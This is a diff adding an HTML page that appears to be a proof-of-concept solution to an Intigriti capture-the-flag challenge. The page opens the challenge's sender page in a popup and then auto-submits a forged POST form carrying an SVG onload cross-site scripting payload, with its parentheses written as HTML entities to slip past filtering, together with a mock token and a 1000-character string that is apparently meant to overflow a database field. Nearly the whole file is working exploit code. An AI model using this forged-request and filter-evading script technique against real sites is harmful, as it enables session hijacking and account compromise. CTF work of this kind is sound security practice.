@@ -1,0 +1,35 @@
+<html xmlns="http://www.w3.org/1999/xhtml">
+    <body>
+
+        <form id="my-form" target="_blank"  method="POST" action="https://challenge-0322.intigriti.io/challenge/LoveReceiver.php">
+            <input type="text"    id='token'       name="token">
+            <input type="text"    id='FirstText'   name="FirstText">
+            <input type="text"    id='Hashing'     name="Hashing">
+            <input type="submit">
+        </form>
+
+        <script>
+
+            let popup = window.open("https://challenge-0322.intigriti.io/challenge/LoveSender.php", "_blank");
+            
+            const payload = "<svg onload='alert&lpar;document.domain&rpar;'>";
+            const varcharOverflow = "A".repeat(1000);
+            const mockToken = 'A'.repeat(64);
+
+            document.getElementById("token").value = mockToken;
+            document.getElementById("FirstText").value = payload;
+            document.getElementById("Hashing").value = varcharOverflow;
+
+            setTimeout(() => {
+
+                popup.close();
+                document.getElementById("my-form").submit();
+
+                setTimeout(() => {
+                    location.reload();
+                },1000)
+            }, 5000);
+
+        </script>
+    </body>
+</html>
